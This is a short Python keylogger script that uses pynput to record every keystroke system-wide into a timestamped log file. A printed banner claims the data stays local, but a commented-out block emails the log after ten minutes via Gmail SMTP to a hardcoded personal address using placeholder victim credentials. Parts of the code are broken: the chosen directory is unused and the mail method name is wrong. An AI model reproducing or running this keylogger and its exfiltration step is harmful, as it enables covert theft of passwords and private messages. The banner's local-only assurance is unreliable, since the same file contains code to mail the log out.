from os import *
from smtplib import *
from time import *
from pynput.keyboard import *
import logging

#log_dir=r"C:\Users\vshak\OneDrive\Python\Keylogging"
log_dir = input("Enter directory where you want your output file: ")
print('''
This is how this works. Every single character you type, this code will record it.
The keystrokes will be recorded only when the code is running. It doesn't matter where you type.
And there is no reason to be paranoid as you can safely delete the file that has the data and the
information will only be available locally.
NOTE: YOU NEED A MODULE CALLED PYNPUT FOR THIS. When you have done typing, you can close this and open
the directory you mentioned before. You will see a text file named keyLog.txt. Click it and you will see your data.''')

logging.basicConfig(filename=("keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
            logging.info(str(key))
with Listener(on_press=on_press) as listener:
            listener.join()
'''
sleep(600)
with open("keyLog.txt",'r') as f:
    dat=f.read()
server=SMTP('smtp.gmail.com',587)
server.login(target,targetpass)
server.sendemail(targetmail,"shakthivelvenkatesan@gmail.com",dat)
server.quit()
'''
